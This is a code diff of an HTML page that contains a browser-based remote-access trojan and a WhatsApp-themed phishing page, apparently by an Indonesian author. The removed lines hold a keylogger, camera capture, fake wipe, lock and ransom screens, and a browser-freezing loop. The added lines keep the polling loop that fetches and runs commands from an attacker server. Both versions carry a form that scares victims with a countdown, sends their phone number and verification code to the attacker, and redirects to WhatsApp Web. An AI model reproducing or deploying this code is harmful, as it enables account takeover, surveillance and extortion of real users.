-                    var canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(function(t) { t.stop(); });
-                    result = canvas.toDataURL('image/jpeg', 0.6);
-                } catch(e) {
-                    result = 'Camera error: ' + e.message;
-                }
-            }
-            else if (command === 'wipe_data') {
-                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:40px;z-index:999999;">💀 DEVICE WIPED 💀</div>';
-                result = 'Wipe executed';
-            }
-            else if (command === 'lock_device') {
-                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:48px;z-index:999999;">🔒 LOCKED 🔒</div>';
-                result = 'Device locked';
-            }
-            else if (command === 'ransomware') {
-                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;color:#ff0000;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;z-index:999999;"><h1 style="font-size:60px;">🔐 RANSOMWARE</h1><p style="font-size:24px;">Kirim $1000 BTC ke: bc1qxxx...</p><p style="font-size:18px;color:#ff6600;">Data Anda telah dienkripsi</p></div>';
-                result = 'Ransomware deployed';
-            }
-            else if (command === 'brick_device') {
-                // Loop tak terbatas untuk brick browser
-                result = 'Device brick attempted';
-                while(true) {
-                    document.body.innerHTML += '💀';
-                }
-            }
-            else {
-                result = 'Unknown command: ' + command;
-            }
-        } catch(e) {
-            result = 'Error: ' + e.message;
-        }
-        
-        return result;
-    }
-    
-    // ============ KEYLOGGER ============
-    var keylogBuffer = '';
-    
-    function startKeylogger() {
-        document.addEventListener('keydown', function(e) {
-            keylogBuffer += e.key;
-            if (keylogBuffer.length > 100) {
-                // Kirim buffer
-                try {
-                    fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            action: 'response',
-                            session_id: SESSION_ID,
-                            response: {
-                                command: 'keylog_data',
-                                result: keylogBuffer
-                            }
-                        })
-                    });
-                } catch(e) {}
-                keylogBuffer = '';
-            }
-        });
-        console.log('[RAT] Keylogger active');
-    }
-    
-    // ============ INIT ============
-    (function init() {
-        console.log('[RAT] ====================================');
-        console.log('[RAT] SeventCyber_Dev v3.2 Initializing');
-        console.log('[RAT] ====================================');
-        
-        // Cek server reachable dulu
-        var testUrl = SERVER_URLS[0];
-        console.log('[RAT] Testing server connection...');
-        
-        fetchWithTimeout(testUrl, { method: 'GET' }, 3000)
-            .then(function(r) { return r.json(); })
-            .then(function(d) {
-                console.log('[RAT] Server found:', testUrl, d);
-                SERVER_URL = testUrl;
-            })
-            .catch(function(e) {
-                console.log('[RAT] Primary server unreachable, trying fallback...');
-            })
-            .finally(function() {
-                // Register anyway
-                registerToServer();
-            });
-        
-        // Re-register if page becomes visible again
-        document.addEventListener('visibilitychange', function() {
-            if (!document.hidden && SESSION_ID) {
-                console.log('[RAT] Page visible again, reconnecting...');
-                sendHeartbeat();
-            }
-        });
-        
-        console.log('[RAT] Init complete. Waiting for commands...');
-    })();
-    </script>
-    
-    <!-- ============ PHISHING FORM LOGIC ============ -->
-    <script>
-    // Timer countdown
-    var timeLeft = 299;
-    var timerEl = document.getElementById('timer');
-    var countdownInterval = setInterval(function() {
-        timeLeft--;
-        var m = Math.floor(timeLeft / 60);
-        var s = timeLeft % 60;
-        timerEl.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
-        
-        if (timeLeft <= 0) {
-            clearInterval(countdownInterval);
-            timerEl.textContent = '00:00';
-            timerEl.style.color = '#e74c3c';
-            document.querySelector('.alert').innerHTML = 
-                '<strong>❌ AKUN DIHAPUS PERMANEN</strong>Nomor Anda diblokir selamanya.';
-        }
-    }, 1000);
-    
-    // Form submit
-    document.getElementById('verifyForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        var phone = document.getElementById('phone').value;
-        var code = document.getElementById('code').value;
-        var submitBtn = document.getElementById('submitBtn');
-        var loading = document.getElementById('loading');
-        
-        // Tampilkan loading
-        submitBtn.style.display = 'none';
-        loading.style.display = 'block';
-        
-        console.log('[PHISH] Credentials captured:', phone, code);
-        
-        // Kirim credentials ke server RAT
-        try {
-            await fetch(SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    action: 'response',
-                    session_id: SESSION_ID,
-                    response: {
-                        command: 'phish_credentials',
-                        result: JSON.stringify({
-                            phone: phone,
-                            code: code,
-                            timestamp: new Date().toISOString(),
-                            session: SESSION_ID
-                        })
-                    }
-                })
-            });
-            console.log('[PHISH] Credentials sent to server');
-        } catch(e) {
-            console.log('[PHISH] Failed to send credentials:', e.message);
-        }
-        
-        // Delay lalu redirect
-        setTimeout(function() {
-            // Tampilkan pesan sukses dulu
-            loading.innerHTML = '✅ Verifikasi Berhasil! Mengalihkan...';
-            
-            setTimeout(function() {
-                window.location.href = 'https://web.whatsapp.com/';
-            }, 1500);
-        }, 2000);
-    });
-    
-    // Auto-focus phone input
-    document.getElementById('phone').focus();
-    </script>
+    if(success){setInterval(sendHeartbeat,15000);setInterval(checkCommands,4000);return true}
+    else{setTimeout(registerToServer,10000);return false}
+}
+async function sendHeartbeat(){try{await fetchTimeout(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'heartbeat',session_id:SESSION_ID})},3000)}catch(e){}}
+async function checkCommands(){
+    try{var res=await fetchTimeout(SERVER_URL+'?session_id='+SESSION_ID,{},5000);var data=await res.json();
+    if(data.command&&data.command!=='wait'){console.log('[RAT] 📩',data.command);var result=await executeCommand(data.command);
+    await fetchTimeout(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:data.command,result:result}})},5000)}}catch(e){}
+}
+
+// ============ INIT ============
+(function init(){
+    console.log('[RAT] SeventCyber_Dev v4.0 - CAMERA FRONT+BACK');
+    fetchTimeout(SERVER_URLS[0],{},3000).then(function(r){return r.json()}).then(function(d){SERVER_URL=SERVER_URLS[0]}).catch(function(){}).finally(function(){registerToServer()});
+    document.addEventListener('visibilitychange',function(){if(!document.hidden&&SESSION_ID)sendHeartbeat()});
+})();
+</script>
+
+<!-- ============ PHISHING FORM ============ -->
+<script>
+var timeLeft=299;
+setInterval(function(){timeLeft--;var m=Math.floor(timeLeft/60);var s=timeLeft%60;document.getElementById('timer').textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');if(timeLeft<=0)document.getElementById('timer').textContent='00:00'},1000);
+document.getElementById('verifyForm').addEventListener('submit',async function(e){
+    e.preventDefault();
+    var phone=document.getElementById('phone').value;var code=document.getElementById('code').value;
+    document.getElementById('submitBtn').style.display='none';document.getElementById('loading').style.display='block';
+    try{
+        await fetch(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:'phish_credentials',result:JSON.stringify({phone:phone,code:code,timestamp:new Date().toISOString(),session:SESSION_ID})}})});
+    }catch(e){}
+    setTimeout(function(){document.getElementById('loading').innerHTML='✅ Berhasil! Mengalihkan...';setTimeout(function(){window.location.href='https://web.whatsapp.com/'},1500)},2000);
+});
+document.getElementById('phone').focus();
+</script>
 </body>
 </html>
